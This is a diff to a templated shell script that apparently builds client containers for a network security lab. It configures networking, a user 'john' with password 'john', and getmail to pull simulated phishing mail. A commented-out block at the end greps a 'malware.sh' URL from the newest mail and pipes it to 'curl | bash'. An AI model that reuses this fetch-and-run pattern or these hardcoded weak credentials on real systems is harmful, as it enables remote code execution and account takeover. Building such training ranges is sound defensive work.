@@ -3,11 +3,66 @@
 {% set LANadmins = (NumberofLANclients | int *AdminPercentage | int *0.01)|int %}
 
 {% for k in range(1, LANadmins | int +1 ) %}
+### set DNS first to avoid resolving issues related to the hosts DNS servers
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "nameserver 1.1.1.1
 nameserver 8.8.8.8" > /etc/resolv.conf'
-docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN apk --no-cache add curl samba-client bash openssh sshpass lftp
+
+### install packages
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN apk --no-cache add curl samba-client bash openssh sshpass lftp busybox-extras python2
+
+### set network configuration
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip addr add 192.168.20.{{k+1}}/24 dev eth1
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip route delete default
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sysctl net.ipv6.conf.all.disable_ipv6=1
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip route add 0.0.0.0/0 via 192.168.20.1 dev eth1
+docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "nameserver 172.16.0.5" > /etc/resolv.conf'
+
+### create a user to retrieve email (the root user cannot be used by getmail)
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN adduser john --gecos "" --disabled-password
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "john:john" | chpasswd'
+
+### install getmail
+docker exec --workdir /getmail-5.16/getmail-5.16 clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'python setup.py install'
+
+### create getmail configuration folder
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/.getmail'
+
+### getmail configuration
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'echo "[retriever]  
+type = SimpleIMAPSSLRetriever
+server = 172.16.0.7
+username = john              
+port = 993
+password = john    
+mailboxes = (\"INBOX\",)
+ 
+[destination]
+type = Maildir     
+path = ~/Maildir/              
+destinations = (\"~/Maildir/\", )
+                               
+[options]                      
+read_all = false    
+delete_after = 30
+delivered_to = false
+received = true     
+verbose = 1         
+message_log = ~/.getmail/log" > ~/.getmail/getmailrc'
+
+### creates directories needed for getmail
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/tmp'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/cur'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/new'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/old'
+
+### start retrieving mails with potential phising
+docker exec -d --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "nohup bash retrieveMail.sh &"
+
+{#
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN getmail
+john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
+grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john|  xargs curl | bash
+#} 
+
 {% endfor %}
